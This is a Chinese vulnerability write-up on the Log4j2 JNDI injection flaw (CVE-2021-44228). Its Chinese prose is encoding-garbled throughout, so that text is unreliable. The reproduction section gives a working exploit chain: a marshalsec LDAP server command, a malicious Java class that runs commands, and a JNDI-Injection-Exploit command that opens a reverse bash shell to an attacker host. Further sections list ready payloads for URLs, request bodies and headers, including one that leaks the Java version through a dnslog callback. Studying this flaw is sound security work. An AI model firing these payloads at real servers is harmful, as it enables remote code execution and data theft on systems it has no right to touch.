# 0x00 æ¼æ´æ¦‚è¿°
Apache Log4j æ˜¯ Apache çš„ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼ŒApache Log4j2æ˜¯ä¸€ä¸ªåŸºäºJavaçš„æ—¥å¿—è®°å½•å·¥å…·ã€‚è¯¥å·¥å…·é‡å†™äº†Log4jæ¡†æ¶ï¼Œå¹¶ä¸”å¼•å…¥äº†å¤§é‡ä¸°å¯Œçš„ç‰¹æ€§ã€‚æˆ‘ä»¬å¯ä»¥æ§åˆ¶æ—¥å¿—ä¿¡æ¯è¾“é€çš„ç›®çš„åœ°ä¸ºæ§åˆ¶å°ã€æ–‡ä»¶ã€GUIç»„ä»¶ç­‰ï¼Œé€šè¿‡å®šä¹‰æ¯ä¸€æ¡æ—¥å¿—ä¿¡æ¯çš„çº§åˆ«ï¼Œèƒ½å¤Ÿæ›´åŠ ç»†è‡´åœ°æ§åˆ¶æ—¥å¿—çš„ç”Ÿæˆè¿‡ç¨‹ã€‚è¯¥æ—¥å¿—æ¡†æ¶è¢«å¤§é‡ç”¨äºä¸šåŠ¡ç³»ç»Ÿå¼€å‘ï¼Œç”¨æ¥è®°å½•æ—¥å¿—ä¿¡æ¯ã€‚

Log4j2ä¸­å­˜åœ¨JNDIæ³¨å…¥æ¼æ´ï¼Œå½“ç¨‹åºå°†ç”¨æˆ·è¾“å…¥çš„æ¶æ„æ•°æ®è¢«æ—¥å¿—è®°å½•æ—¶ï¼Œå³å¯è§¦å‘æ­¤æ¼æ´ï¼ŒæˆåŠŸåˆ©ç”¨æ­¤æ¼æ´å¯ä»¥åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

![image](https://user-images.githubusercontent.com/84888757/162125396-59c35299-9ff0-4f1f-b4d1-42e42d994a42.png)

# 0x01 å½±å“ç‰ˆæœ¬
Apache Log4j 2.x < 2.15.0-rc2

# 0x02 æ¼æ´åˆ†æ
æ ¹æ®[å®˜æ–¹çš„ä¿®è®¢ä¿¡æ¯](https://issues.apache.org/jira/projects/LOG4J2/issues/LOG4J2-3201?filter=allissues)ï¼Œå¯ä»¥çŸ¥é“è¯¥æ¼æ´çš„åˆ©ç”¨æ–¹å¼æ˜¯ï¼šé€šè¿‡ JNDI æ³¨å…¥çš„æ–¹å¼å®ç°äº† RCE

æ ¹æ®[è¡¥ä¸æ›´æ”¹è®°å½•](https://github.com/apache/logging-log4j2/commit/7fe72d6)ï¼Œå¯ä»¥å‘ç°å¯¹`lookup`å‡½æ•°è¿›è¡Œäº†ä¿®æ”¹åˆ¤æ–­ã€‚

![image](https://user-images.githubusercontent.com/84888757/162127103-50052d95-7549-4f16-81fe-e9ff17b99f58.png)

æŸ¥çœ‹å®˜æ–¹æ–‡æ¡£ä¸­å…³äºlookupçš„è¯´æ˜ï¼Œå¯ä»¥å¾—çŸ¥`lookup`æä¾›äº†ä¸€ç§åœ¨ä»»æ„ä½ç½®å‘ Log4j2 é…ç½®æ·»åŠ å€¼çš„æ–¹æ³•ï¼Œæ˜¯å®ç°StrLookupæ¥å£çš„ç‰¹æ®Šç±»å‹çš„æ’ä»¶ã€‚

- å…¶ä¸­å°±åŒ…æ‹¬æœ¬æ¬¡æ¼æ´ä¸­å…³é”®çš„`jndi`æ–¹æ³•ã€‚

æ ¹æ®JNDI lookupå®˜æ–¹æ–‡æ¡£è¯´æ˜ï¼ŒJNDI Lookupå…è®¸é€šè¿‡ JNDI æ£€ç´¢å˜é‡ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š
```
<File name="Application" fileName="application.log">
    <PatternLayout>
        <pattern>%d %p %c{1.} [%t] $${jndi:logging/context-name} %m%n</pattern>
    </PatternLayout>
</File>
```

åœ¨log4j `jdni`çš„ç”¨æ³•æ ¼å¼å¦‚ä¸‹ï¼š
```
${jndi:JNDIContent}
```

æ‰€ä»¥ç°åœ¨çš„æ€è·¯å¦‚ä¸‹ï¼š
- è§¦å‘æ¼æ´çš„ç‚¹æ˜¯lookup
- å¯ä»¥é€šè¿‡lookup -> è°ƒç”¨JNDI -> è°ƒç”¨LDAPè¿›è¡ŒRCE
- æ”»å‡»è€…å¯é€šè¿‡ä¼ å…¥payload `${jndi:JNDIContent}` å®ç°ä»¥ä¸Šä¸¤æ­¥

é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œä»å“ªé‡Œä¼ å…¥`payload ${jndi:JNDIContent}` ï¼Ÿ

ç­”æ¡ˆæ˜¯ï¼š`LogManager.getLogger().xxxx()` æ–¹æ³•

åœ¨log4j2ä¸­ï¼Œå…±æœ‰8 ä¸ªæ—¥å¿—çº§åˆ«ï¼Œå¯ä»¥é€šè¿‡LogManager.getLogger()è°ƒç”¨è®°å½•æ—¥å¿—çš„æ–¹æ³•å¦‚ä¸‹ï¼š
```
LogManager.getLogger().error()
LogManager.getLogger().fatal()

LogManager.getLogger().trace()
LogManager.getLogger().traceExit()
LogManager.getLogger().traceEntry()
LogManager.getLogger().info()
LogManager.getLogger().warn()
LogManager.getLogger().debug()
LogManager.getLogger().log()
LogManager.getLogger().printf()
```
ä½†æ˜¯åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œåªæœ‰`error()`å’Œ`fatal()`æ–¹æ³•å¯é»˜è®¤è§¦å‘æ¼æ´ï¼Œå…¶ä½™çš„æ–¹æ³•éœ€è¦é…ç½®æ—¥å¿—çº§åˆ«æ‰å¯ä»¥è§¦å‘æ¼æ´ã€‚

å› ä¸ºåœ¨logIfEnabledæ–¹æ³•ä¸­ï¼Œå¯¹å½“å‰æ—¥å¿—ç­‰çº§è¿›è¡Œäº†ä¸€æ¬¡åˆ¤æ–­ï¼Œåªæœ‰å½“**å½“å‰äº‹ä»¶çš„æ—¥å¿—ç­‰çº§**å¤§äºç­‰äº**è®¾ç½®çš„æ—¥å¿—ç­‰çº§**æ—¶ï¼Œæ‰ä¼šç¬¦åˆæ¡ä»¶ï¼Œè¿›å…¥logIfEnabledæ–¹æ³•ï¼Œå…·ä½“çš„æ•´ä¸ªä»£ç æµç¨‹æˆ‘ä»¬æ¥çœ‹ä»¥ä¸‹éƒ¨åˆ†ã€‚

## ç¯å¢ƒæ­å»º
1ã€åˆ›å»ºä¸€ä¸ªæ–°çš„mavené¡¹ç›®ï¼Œå¹¶å¯¼å…¥Log4jçš„ä¾èµ–åŒ…
```
    <dependencies>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-core</artifactId>
            <version>2.14.1</version>
        </dependency>
    </dependencies>
```
2ã€æ¼æ´ä»£ç 
   log4j_rce.java
```
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class log4j_rce {
    private static final Logger logger = LogManager.getLogger(log4j_rce.class);
    public static void main(String[] args) {
        logger.error("${jndi:ldap://xxxxx.dnslog.cn/exp}");
    }
}
```

## ä»£ç è°ƒè¯•åˆ†æ

åœ¨å°è¯•ç†è§£ä¸€ä¸ªæ¼æ´æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åªçœ‹ä¸€äº›å…³é”®çš„å‡½æ•°è°ƒç”¨ï¼Œè®©æˆ‘ä»¬å¼€å§‹å§ï¼

ä¸‹æ–­ç‚¹ï¼Œè°ƒè¯•

![image](https://user-images.githubusercontent.com/84888757/162129881-ed7c9622-ff6c-4366-90a8-df6cc2fca322.png)

è·Ÿè¿›ï¼Œé¦–å…ˆä¼šè°ƒç”¨`AbstractLogger.class`ä¸­çš„`error()`æ–¹æ³•ï¼š

![image](https://user-images.githubusercontent.com/84888757/162129954-b6ff07fe-9797-4a5e-94d2-d2286685eb70.png)

åœ¨`error()`æ–¹æ³•ä¸­ä¼šè°ƒç”¨`logIfEnabled`åˆ¤æ–­æ˜¯å¦ç¬¦åˆæ—¥å¿—è®°å½•çš„ç­‰çº§è¦æ±‚ï¼Œå¦‚æœç¬¦åˆï¼Œé‚£ä¹ˆä¼šè¿›è¡Œ`logMessage`æ“ä½œï¼š

![image](https://user-images.githubusercontent.com/84888757/162130135-2fb13eab-aa1d-4d28-9dce-ceed7eb851f6.png)

åç»­ä¸å…³é”®è°ƒç”¨è·¯å¾„å¦‚ä¸‹ï¼š

```
logMessage ----> logMessageSafely ----> logMessageTrackRecursion ----> tryLogMessage ----> log ----> DefaultReliabilityStrategy.log ----> loggerConfig.log ----> processLogEvent ----> callAppenders ----> tryCallAppender ----> append ----> tryAppend ----> directEncodeEvent ----> encode ----> toText ----> toSerializable ---->format----> PatternFormatter.format
```

æ­¤æ—¶ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†å…³é”®ç‚¹ `format()` 

åœ¨ `org.apache.logging.log4j.core.pattern.MessagePatternConverter` çš„ `format()` æ–¹æ³•ï¼Œæ›¿æ¢äº†æ”»å‡»è€…æ¶æ„çš„è¡¨è¾¾å¼ã€‚

å¦‚æœæ£€æµ‹åˆ°`$`å­—ç¬¦åè·Ÿäº†ä¸€ä¸ª`{`å­—ç¬¦ï¼Œé‚£ä¹ˆä¼šå¯¹ç›´åˆ°`}`ä¸­é—´çš„å†…å®¹è¿›è¡Œè§£æå¹¶æ›¿æ¢replaceæ“ä½œã€‚

![image](https://user-images.githubusercontent.com/84888757/162130705-0c32a15c-c4a1-43fa-a731-59f0d553c63d.png)

ç»§ç»­ä¸€æ­¥ä¸€æ­¥è·Ÿè¿›ï¼Œç›´åˆ°ä¸‹ä¸€ä¸ªå…³é”®ç‚¹`Interpolator.lookup`
```
replace --> substitute --> StrSubstitutor.substitute --> resolveVariable --> Interpolator.lookup
```

æ›¿æ¢replaceæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²æŸ¥æ‰¾çš„è¿‡ç¨‹ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š
- åœ¨`Interpolator.lookup`æ–¹æ³•ä¸­ï¼Œå°†`${xxx:yyy}`çš„ç»“æ„ç”± `:` å­—ç¬¦è¿›è¡Œåˆ†å‰²ï¼Œè§£æä¸º`prefix`å’Œ`name`ä¸¤éƒ¨åˆ†ã€‚
- åœ¨`Interpolator.lookup`æ–¹æ³•ä¸­ï¼Œé€šè¿‡`prefix`å»`strLookupMap`å“ˆå¸Œè¡¨æŸ¥è¯¢å¯¹åº”çš„`lookup`æ–¹æ³•ï¼Œå†é€šè¿‡å®ä¾‹è°ƒç”¨ç›¸åº”çš„`lookup()`æ–¹æ³•ï¼Œå°†`name`ä½œä¸ºå‚æ•°å¸¦å…¥æ‰§è¡Œã€‚

è¿™é‡Œæ˜¯ `JNDI` æ–¹æ³•ï¼Œé‚£ä¹ˆå°±ä¼šç”±`JndiLookup`ç±»è¿›ä¸€æ­¥å¤„ç†ï¼š

![image](https://user-images.githubusercontent.com/84888757/162131237-996b3f5f-b736-48d6-8c6f-dc508bb75087.png)

![image](https://user-images.githubusercontent.com/84888757/162131307-8f33e311-2f7a-4e50-a106-4525d280bdb4.png)

è·Ÿè¿›`JndiLookup`ï¼Œæ‰¾åˆ°æœ€åçš„è§¦å‘ç‚¹`jndiManager.lookup`

![image](https://user-images.githubusercontent.com/84888757/162131659-54b1c759-e197-4b70-bf32-d7d084d315de.png)

æœ€åè·Ÿå…¥çš„è§¦å‘ç‚¹`org.apache.logging.log4j.core.net.JndiManager#lookup`å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚

é€šè¿‡jndiåŠ è½½ç”±æ”»å‡»è€…ä¼ å…¥çš„LDAPæœåŠ¡ç«¯åœ°å€ï¼Œç„¶åè¿”å›ä¸€ä¸ªæ¶æ„çš„JNDI Referenceå¯¹è±¡ï¼Œè§¦å‘æ¼æ´ï¼Œå®ç° RCEã€‚

![image](https://user-images.githubusercontent.com/84888757/162132266-b45a4cc9-70e7-4b17-9d86-6ce41589b35a.png)

# 0x03 æ¼æ´å¤ç°
å†™å¤ç°è¿‡ç¨‹çš„æ—¶å€™ï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯ macOS ç³»ç»Ÿï¼Œå¦‚æœæ˜¯ Windows ç³»ç»Ÿï¼Œåˆ™å¯åŠ¨è®¡ç®—å™¨ä»£ç å¦‚ä¸‹ï¼š
- String[] commands = {"calc.exe"};

æ¼æ´ä»£ç ï¼šlog4j_rce.java
```
package org.example;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class log4j_rce {
    private static final Logger logger = LogManager.getLogger(log4j_rce.class);
    public static void main(String[] args) {
        logger.error("${jndi:ldap://127.0.0.1:9999/CalcPoc}");
    }
}
```

ä½¿ç”¨marsharsecå¼€å¯ä¸€ä¸ªLDAPæœåŠ¡
```
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#CalcPoc" 9999
```

![image](https://user-images.githubusercontent.com/84888757/162133243-22ca3f03-3133-4830-a65c-aff0776c368b.png)

ç¼–å†™æ¶æ„javaæ–‡ä»¶
- CalcPoc.java
```
import java.lang.Runtime;
import java.lang.Process;


public class CalcPoc{
  public CalcPoc() {
    try {
      System.out.println("--- æ¼æ´ä»£ç å¼€å§‹æ‰§è¡Œ ---");
      String[] commands = {"open", "/System/Applications/Calculator.app"}; // å¯åŠ¨ç³»ç»Ÿè®¡ç®—å™¨
      Process pc = Runtime.getRuntime().exec(commands);
      pc.waitFor();
      System.out.println("--- æ¼æ´ä»£ç å®Œæˆæ‰§è¡Œ ---");
    } catch (Exception e) {
      e.printStackTrace();
    }
  }
}
```

ç¼–è¯‘æ¶æ„ç±»ï¼šjavac CalcPoc.java

å¼€å¯httpæœåŠ¡ä»¥ä¾¿è·å–æ¶æ„ç±»

![image](https://user-images.githubusercontent.com/84888757/162133467-257568c0-be52-4cf5-9e17-ecb2f4b8be08.png)

è¿è¡Œæ¼æ´ä»£ç ï¼ŒæˆåŠŸï¼š

![image](https://user-images.githubusercontent.com/84888757/162133521-aed18334-ff6b-485f-afa6-ca841d00093f.png)

![image](https://user-images.githubusercontent.com/84888757/162133637-9277cd02-f308-4b96-8f83-aab854bd0fe1.png)

![image](https://user-images.githubusercontent.com/84888757/162133703-4a52dd3e-ae90-49dd-91e7-2212a662102c.png)

å¦‚æœæƒ³åå¼¹shellï¼Œä½ åªéœ€è¦ä¿®æ”¹æ¶æ„ç±»ä¸­çš„å‘½ä»¤å³å¯ã€‚

è¿™é‡Œä¸ºäº†ä¾¿äºç†è§£åˆ©ç”¨æµç¨‹ï¼Œå¤ç°æ—¶ä½¿ç”¨äº†marsharsecå·¥å…·èµ·LDAPæœåŠ¡ï¼Œå¹¶ä¸”å†èµ·äº†httpæœåŠ¡å­˜æ”¾æ¶æ„ç±»ã€‚

åœ¨å®é™…åˆ©ç”¨æ—¶ï¼Œå¯ä»¥ä½¿ç”¨[JNDI-Injection-Exploit](https://github.com/welk1n/JNDI-Injection-Exploit/releases)å·¥å…·ï¼Œæ›´åŠ æ–¹ä¾¿ã€‚
```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,base64ç¼–ç åçš„å‘½ä»¤}|{base64,-d}|{bash,-i}" -A "vps_ip"
```

![image](https://user-images.githubusercontent.com/84888757/165697356-40406213-ecb8-4432-8c1a-314adad199c9.png)

![image](https://user-images.githubusercontent.com/84888757/165697563-ad29bb0b-3434-434e-aca4-b4cabb13c8a0.png)

![image](https://user-images.githubusercontent.com/84888757/165697719-9b3687ab-07eb-40f1-a59e-28fc746cf3ad.png)



# 0x04 RC1ç»•è¿‡
- [Apache Log4j2ä»RCEåˆ°RC1ç»•è¿‡ @4ra1n](https://xz.aliyun.com/t/10649)


payloadå¦‚ä¸‹ï¼Œåœ¨ä¹‹å‰çš„åŸºç¡€ä¸ŠåŠ ä¸ªç©ºæ ¼ï¼š
```
${jndi:ldap://127.0.0.1:1389/ badClassName}
```

# 0x05 å¸¸è§æ¼æ´ä½ç½®
## URL
- URLè·¯å¾„
    - ğŸŒ° Apache Druidçš„POCï¼š`http://example.com/druid/coordinator/v1/lookups/config/${jndi:ldap://xxxx.dnslog.cn/test}`
- URLå‚æ•°
    - ğŸŒ° Apache Solrçš„POCï¼š`http://example.com/solr/admin/cores?action=${jndi:ldap://xxxx.dnslog.cn/test}`

## HTTP Body
- å¯èƒ½å­˜åœ¨æ¼æ´çš„åŠŸèƒ½ç‚¹ï¼šç™»å½•ã€ä¸šåŠ¡æµç¨‹ã€å®¡æ‰¹æ¥å£ç­‰ã€‚
- å¯èƒ½å­˜åœ¨ä¸åŒçš„è¯·æ±‚æ ¼å¼ï¼šä¾‹å¦‚Formã€Jsonã€XMLç­‰ã€‚
- å¯èƒ½ä¼šå¯¹å‚æ•°è¿›è¡Œç¼–ç ã€åŠ å¯†ç­‰æ“ä½œï¼ŒåŠ å¤§æ£€æµ‹éš¾åº¦ã€‚

ğŸŒ° ç™»å½•å£ - Formæ ¼å¼
```
POST /zkaq/log4jrce HTTP/1.1
Host: d63bb2586.lab.aqlab.cn
Connection: close

username=${jndi:ldap://xxxx.dnslog.cn/def}&password=123456
```
 
ğŸŒ° æŸæ¬¡å®æˆ˜æ¡ˆä¾‹ - jsonæ ¼å¼
    
```
POST /xxx/xxxx HTTP/1.1
Host: xx.xx.xx.xx
Connection: close
Content-Length: 153
Content-Type: application/json

{"type":"delete","se":{"runningSessions":[],"bUrl":"${jndi:ldap://${sys:java.version}.xxx.dnslog.cn}"}}
```

## Header
- å¯èƒ½å­˜åœ¨æ¼æ´çš„Headerå­—æ®µï¼šX-Forworded-Forã€Acceptã€User-Agentç­‰
- ä¹Ÿæœ‰éƒ¨åˆ†æ¡†æ¶ä¸­çš„Log4jæ¼æ´å­˜åœ¨äºHeaderä¸­
    - [Struts2æ¡†æ¶ï¼Œheaderä¸­çš„`If-Modified-Since`å­—æ®µå­˜åœ¨è¯¥æ¼æ´](https://twitter.com/payloadartist/status/1469987703429103622)
    - ğŸŒ° æŸæ¬¡å®æˆ˜æ¡ˆä¾‹ - Acceptå­—æ®µ
```
POST /aaa/bbbb HTTP/1.1
Host: xx.xx.xx.xx
Accept: ${jndi:dns://xxxx.dnslog.cn/test}
Content-Type: application/json
Connection: close

{
"username"="admin",
"password"="123456"
}
```

# 0x06 å‚è€ƒé“¾æ¥
- [JNDI æ³¨å…¥æ¼æ´çš„å‰ä¸–ä»Šç”Ÿ @evilpan](https://mp.weixin.qq.com/s/vnMU-GQgNEVdi2hr839jOA)
- [log4j2 JNDI æ³¨å…¥æ¼æ´åˆ†æ @panda](https://www.cnpanda.net/sec/1114.html)
- [SpringBoot - Log4j2è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´è¯¦è§£ @hangge](https://www.hangge.com/blog/cache/detail_3153.html)
- [Apache Log4j2ä»RCEåˆ°RC1ç»•è¿‡ @4ra1n](https://xz.aliyun.com/t/10649)
- [log4j2 JNDIæ³¨å…¥æ¼æ´é€Ÿé€š @LoRexxar](https://lorexxar.cn/2021/12/10/log4j2-jndi/)
- [Log4j2-CVE-2021-44228(å…¨) @jas502n](https://github.com/jas502n/Log4j2-CVE-2021-44228)
- [CVE-2021-44228(Log4j2 RCE)å¸¸è§æ¼æ´ä½ç½®](https://blog.wanghw.cn/security/cve-2021-44228-vul-location.html)
- [LDAPæ³¨å…¥ä¸é˜²å¾¡å‰–æ @r00tgrok](http://drops.leesec.com/#!/drops/155.LDAP%E6%B3%A8%E5%85%A5%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%89%96%E6%9E%90)
